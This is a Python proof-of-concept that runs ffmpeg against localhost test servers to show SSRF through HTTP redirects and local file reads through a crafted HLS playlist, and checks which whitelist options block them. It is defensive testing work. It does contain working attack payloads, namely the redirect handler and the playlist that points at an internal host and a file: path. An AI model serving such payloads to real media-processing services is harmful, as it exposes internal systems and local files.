#!/usr/bin/env python3
"""OpenSeek security PoC: how ffmpeg behaves when given hostile URLs.

LOCALHOST ONLY. Starts two throwaway HTTP servers on 127.0.0.1 (an "attacker
origin" A and an "internal service" B that records every hit), plus a canary
.ts file in a temp dir, then runs ffmpeg against A under several option sets.

What it demonstrates (see THREAT-MODEL.md section 5):
  P1  ffmpeg follows an HTTP 302 from A to B on its own: a URL that passed a
      pre-check on A's address still reaches B (SSRF via redirect).
  P2  an HLS playlist served by A makes ffmpeg open segments on B and, when the
      extension looks like media, a local file: path (local file read).
  P3  -protocol_whitelist http,tcp blocks file: but NOT the hop to B (B is also
      http): the whitelist is necessary, not sufficient.
  P4  -format_whitelist matroska,mov (no hls) stops the playlist entirely.

Usage:  python -I ffmpeg_ssrf_probe.py [path-to-ffmpeg]
Exit 0 always; prints a PASS/FAIL-style table of observed behaviour.
"""
from __future__ import annotations

import http.server
import os
import shutil
import subprocess
import sys
import tempfile
import threading

HITS: list[str] = []


class InternalService(http.server.BaseHTTPRequestHandler):
    def do_GET(self):  # noqa: N802
        HITS.append(self.path)
        self.send_response(404)
        self.end_headers()

    def log_message(self, *a):
        pass


def make_attacker(b_port: int, canary: str):
    class Attacker(http.server.BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            if self.path.startswith("/redir"):
                self.send_response(302)
                self.send_header("Location", f"http://127.0.0.1:{b_port}/after-redirect")
                self.end_headers()
                return
            if self.path.startswith("/list.m3u8"):
                body = (
                    "#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:1\n"
                    "#EXTINF:1.0,\n"
                    f"http://127.0.0.1:{b_port}/hls-segment.ts\n"
                    "#EXTINF:1.0,\n"
                    f"file:{canary}\n"
                    "#EXT-X-ENDLIST\n"
                ).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/vnd.apple.mpegurl")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return
            self.send_response(404)
            self.end_headers()

        def log_message(self, *a):
            pass

    return Attacker


def serve(handler):
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def run(ffmpeg: str, args: list[str]) -> str:
    cmd = [ffmpeg, "-hide_banner", "-nostdin", "-loglevel", "debug", *args, "-f", "null", "-"]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return p.stderr
    except subprocess.TimeoutExpired:
        return "TIMEOUT"


def main() -> None:
    ffmpeg = sys.argv[1] if len(sys.argv) > 1 else shutil.which("ffmpeg")
    if not ffmpeg:
        print("ffmpeg not found")
        return
    tmp = tempfile.mkdtemp(prefix="openseek-poc-")
    canary = os.path.join(tmp, "canary.ts").replace("\\", "/")
    subprocess.run([ffmpeg, "-hide_banner", "-loglevel", "error", "-y", "-f", "lavfi",
                    "-i", "testsrc=size=64x36:rate=5:duration=1", "-f", "mpegts", canary],
                   check=True)
    b = serve(InternalService)
    a = serve(make_attacker(b.server_address[1], canary))
    A = f"http://127.0.0.1:{a.server_address[1]}"

    def case(name, args, expect_b, expect_file):
        HITS.clear()
        err = run(ffmpeg, args)
        file_opened = ("canary.ts" in err and "Opening 'file:" in err
                       and "Protocol 'file' not on whitelist" not in err)
        b_hit = bool(HITS)
        print(f"{name:<58} internal-hit={str(b_hit):<5} file-opened={str(file_opened):<5} "
              f"B-paths={HITS}")
        return b_hit, file_opened

    print(f"ffmpeg: {ffmpeg}")
    case("P1 plain -i A/redir", ["-i", f"{A}/redir"], True, False)
    case("P2 plain -i A/list.m3u8", ["-i", f"{A}/list.m3u8"], True, True)
    case("P3 -protocol_whitelist http,tcp -i A/list.m3u8",
         ["-protocol_whitelist", "http,tcp", "-i", f"{A}/list.m3u8"], True, False)
    case("P3b -protocol_whitelist http,tcp -i A/redir",
         ["-protocol_whitelist", "http,tcp", "-i", f"{A}/redir"], True, False)
    case("P4 +format_whitelist matroska,mov -i A/list.m3u8",
         ["-protocol_whitelist", "http,tcp", "-format_whitelist", "matroska,mov",
          "-i", f"{A}/list.m3u8"], False, False)
    print("\nInterpretation: any internal-hit=True row is an SSRF the URL pre-check cannot stop;"
          " only the loopback range proxy (ffmpeg never sees the real URL) closes P1/P3b.\n"
          "Note (ffmpeg 9.0.1, observed): nested opens from an http input inherit the default\n"
          "whitelist 'http,https,tls,rtp,tcp,udp,crypto,httpproxy,data' - file: is refused, but\n"
          "udp/rtp/data/crypto are NOT. Always pass an explicit -protocol_whitelist.")
    a.shutdown(); b.shutdown()
    shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    main()
